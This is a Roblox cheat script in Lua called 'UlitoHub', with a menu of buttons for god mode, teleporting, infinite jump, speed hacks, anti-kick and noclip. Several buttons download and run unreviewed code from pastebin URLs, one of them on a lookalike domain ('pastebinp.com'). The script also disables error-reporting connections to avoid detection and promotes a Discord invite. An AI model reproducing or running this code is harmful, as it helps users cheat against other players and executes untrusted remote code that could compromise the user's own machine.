local b = Instance.new("BindableFunction")
function b.OnInvoke(response) if response == "Copy Link" then if setclipboard then setclipboard("discord.gg/bDVqjKds34") end end end
game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Join discord server", Text = "UlitoHub", Duration = 5, Callback = b, Button1 = "Copy Link"})

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("UlitoHub", "DarkTheme")

local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Main")
local Tab2 = Window:NewTab("Message")
local Tab3 = Window:NewTab("Credits")
local Section3 = Tab3:NewSection("Discord Username")


Section:NewButton("GodMode", "GODMODE BRO WTF", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/MSZAznxp", true))()
end)
Section:NewButton("ControlTP", "Press control and click!!", function()
    loadstring(game:HttpGet("https://pastebinp.com/raw/PhqLjbV9", true))()
end)
Section:NewButton("Give All TOOLS", "Detectable", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/ngVWmQ8m", true))()
end)
Section:NewButton("Instant Win", "Yeah! Finish", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.workspace.tower.sections.finish.exit.ParticleBrick.CFrame
end)
Section:NewButton("Inf Jump", "OMG JUMP JUMP", function()
local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
end) 
Section:NewSlider("WalkSpeed", "SliderInfo", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)
Section:NewSlider("JumpPower", "SliderInfo", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)
Section:NewButton("AntiKick", "Use this", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/BMGbkQ71", true))()
end)
Section:NewButton("Noclip (B)", "Noclip ok", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Czgaerid", true))()
end)
Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.F, function()
	Library:ToggleUI()
end)
Section3:NewButton("Credits: ulitooo", "UlitoHub", function()
    print("Okkkkkkkkk")
end)

-- Game Functions --
if getconnections then
    for i,v in pairs(getconnections(game:GetService("ScriptContext").Error)) do
      v:Disable()
    end
  end